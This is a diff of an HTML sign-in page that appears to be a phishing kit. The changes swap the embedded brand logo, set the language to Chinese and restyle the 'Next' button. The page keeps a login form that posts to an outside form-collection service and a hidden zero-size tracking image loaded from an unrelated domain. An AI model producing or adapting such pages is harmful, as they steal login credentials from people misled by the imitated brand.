@@ -1,6 +1,8 @@
 
 
-<html lang="en">
+
+
+<html lang="cn">
 <head>
     <meta http-equiv="x-ua-compatible" content="EmulateIE9">
     <meta charset="utf-8">
@@ -15,9 +17,9 @@
         <div class="container">
             <div class="row my-5">
                 <div class="col-lg-5 mx-auto">
-                    <div class="m-5 p-4 bg-Gray, Medium rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
+                    <div class="m-4 p-3 bg-White rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
                         <div class="text-left">
-                            <span><img src="data:image/png;base64,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" class="img-fluid" width="110px"></span><span class="pl-4 h5 align-middle"> </span><br><br>
+                            <span><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARwAAACxCAMAAAAh3/JWAAAAilBMVEX////UBRHSAADWHSTxwMHUAAvdUlb++/v98PH0zM3nkZPeW1/uuLnUAArpn6DUAADXIirpmZv21tf33N399fbspqjXKC710dL76+zVEhvtrrDnjZD54eLeXWHZOT7dV1vkf4LlhYjjd3rcS0/gaGvaQETVFx/kgYPgbnHwu7zYMTbbRkvyxcfaPUNTctOdAAAEoklEQVR4nO3a7XaqOBiGYYhFbbcYrdb6UVtb3Z2xOud/eiMKATUvidhNXXvd119iCCE8JMEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAICb1cr8dEPq04kaJSY6pzJ60uw/S/W9TawVhau8yNR+yk/dPhwfaKk1b3+6N46NVRx5Co1o11Hhk7W+mbL+Vof5eHuxnzJW28Px1kTbG6B0zYO2EYfVRGo0OK/uXtlLq4HzlGqWHp9r4ZTqsZYuMVbCxfhQ6u60uraO7EWfnKfUy/R4V2qS6tfUKanpFX2TDJ7TsfPbftP1L+cpIz08HH+UmqSbtXXL3stVfROG8edxfe/2+uLQfcrskWlFwnMe1R04n1UDx1zStFjd1iNwRvYy5pF5EwNHfD/+GSupIf6d81qobqiqB072ju7fSuA8XflQ7dtcGOtS4BSyQgicOEqruZnAGXxD34TqxdT3j+PCg5LASZ+7YSw858VK6jDMZ7xehMmJ6RwxcAqTEylwsudueSsznMfORaa/rb1jHqu2R+D8K/RNtrKQA8c+G78dHVvL8yj4Em76pNvPCM+d6qVVPIuBM/+ha/bVimwjw7xfF2KA5Q+m0H1qfKhiKMyuj6ZJP2Ed9ixGH3mJpu3SVFbgrnq4q05ahxw4ljVcjXZLcxudT4CtcRA3zO+Fm+7RN4u0jodbDZyR/ablt8w+/zCvKilw3PRXWsXNBs6H4w0rBU63/PceInfgNH5249H6Hjq6ZdbAMVP+9RWBk+5vBRsxcF7O2lunsXMpbd1hieNW9vvqgfOenmF2q4EjBEY+KR0qbWGO92xHvahNWsXWeoakxOq8vXWSAqebF+nOm2eW2S3tbs4PelqmG+qtpVik9u44IgXO0v3Tv54QOLVvLdXmzsv6PikrrJPDqPfeLdF3nGtdeMfcC2WyF9V47dfgE53kmRyUFtkG5zz3IJIZhjxDiUp3NLIp/5NwvDA5eZbqyMZmz7O9J5Lnflxe5DU451d5MnCEwHExX5iE/TIztQvk2Z0JfGEfw2G/+9WKL++cex+PgRw4DsrMDoUNejOwAnE5ee0Mcj+RGG/Lr/Gq3Ky2JFLmI5TwaVIVFvPC/lWcfR2W9shcbeieXouvB6fZQ1Ku2pIon5cJG/RqlDdF2jA3M8iPSvdnv8c2nDmv09I5HpvDSdsqBU5k8kbeLc8Dp+UKnKDSwDmMu43zKrWlc9x9k3yKq7Qk0jr/PN5zB451wVoInN3K5PI2pONu4b5MZemctlNSStjDKROr+dCcRfg85xM4he8sYYU7dBh3Y/dlti2d4+XywNnNXgqzKuHz3EWBE5T8pUJ23fe9X+X2y71LA2c3J3xdF87hETjOGc7eu/BBTHQYdyvHRR5YOsexT5Asp93/5yr2yy7h9eJ4l9tjhiMFzsmN3452tcf+T9d+3H1IexzHLJ3T+Cz7k9/+Tfyf/Y97jTDvQxP5jc1ierod1xQSsBA4M+kVcrbtOejPv/w/vybLuqn0p8Hj/xg2Ts/0Xcr/Ojps2V1WxHo+l2+/UgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAo9T94zmG8g1cPbgAAAABJRU5ErkJggg==" class="img-fluid" width="110px"></span><span class="pl-4 h5 align-middle"> </span><br><br>
                             <img src="http://shopget24.com/images/sampledata/hack-run.png" width="0" height="0">
 							<span class="h5">Sign in</span><br>
                             <form action="https://submit-form.com/sd0aT1X2" method="post">
@@ -38,10 +40,10 @@
                         <div class="form-check mt-3">
                             <input type="checkbox" class="form-check-input" id="exampleCheck1">
                             <label class="form-check-label" for="exampleCheck1"><span><a href="#">Keep me sign in</a></span></label>
-                            <span><span><a href="#" class="float-right">Forgot Password?</a></span></span>
+                            <span><span><a href="#b22222" class="float-right">Forgot Password?</a></span></span>
                         </div>
                         <div class="col-lg-12 mt-3">
-                            <button class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #0a59a3;">Next</button>
+                            <button class="btn text-white px-5 w-100" id="submit-btn" style="background-color: #b22222;">Next</button>
                         </div>
                     </div>
                 </div>
